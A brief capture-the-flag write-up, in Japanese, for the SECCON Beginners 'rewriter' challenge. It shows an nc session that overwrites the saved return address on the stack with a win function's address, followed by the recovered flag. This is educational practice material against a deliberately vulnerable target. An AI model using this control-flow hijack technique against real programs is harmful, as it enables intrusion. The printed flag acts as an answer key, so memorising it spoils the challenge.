# rewriter

> 任意のアドレスの値を書き換えたい時，ありますよね?

## Write-up

`<- saved ret addr`の値を`win`関数のアドレスに書き換えます。

```
$ nc rewriter.quals.beginners.seccon.jp 4103

[Addr]              |[Value]
====================+===================
 0x00007ffeb0990cb0 | 0x0000000000000000  <- buf
 0x00007ffeb0990cb8 | 0x0000000000000000
 0x00007ffeb0990cc0 | 0x0000000000000000
 0x00007ffeb0990cc8 | 0x0000000000000000
 0x00007ffeb0990cd0 | 0x0000000000000000  <- target
 0x00007ffeb0990cd8 | 0x0000000000000000  <- value
 0x00007ffeb0990ce0 | 0x0000000000401520  <- saved rbp
 0x00007ffeb0990ce8 | 0x00007f01e226ebf7  <- saved ret addr
 0x00007ffeb0990cf0 | 0x0000000000000001
 0x00007ffeb0990cf8 | 0x00007ffeb0990dc8

Where would you like to rewrite it?
> 0x00007ffeb0990ce8
0x00007ffeb0990ce8 = 0x00000000004011f6

[Addr]              |[Value]
====================+===================
 0x00007ffeb0990cb0 | 0x3030303030307830  <- buf
 0x00007ffeb0990cb8 | 0x3131303430303030
 0x00007ffeb0990cc0 | 0x00000000000a3666
 0x00007ffeb0990cc8 | 0x0000000000000000
 0x00007ffeb0990cd0 | 0x00000000004011f6  <- target
 0x00007ffeb0990cd8 | 0x00007ffeb0990ce8  <- value
 0x00007ffeb0990ce0 | 0x0000000000401520  <- saved rbp
 0x00007ffeb0990ce8 | 0x00000000004011f6  <- saved ret addr
 0x00007ffeb0990cf0 | 0x0000000000000001
 0x00007ffeb0990cf8 | 0x00007ffeb0990dc8
```

## Flag

`ctf4b{th3_r3turn_4ddr355_15_1n_th3_5t4ck}`
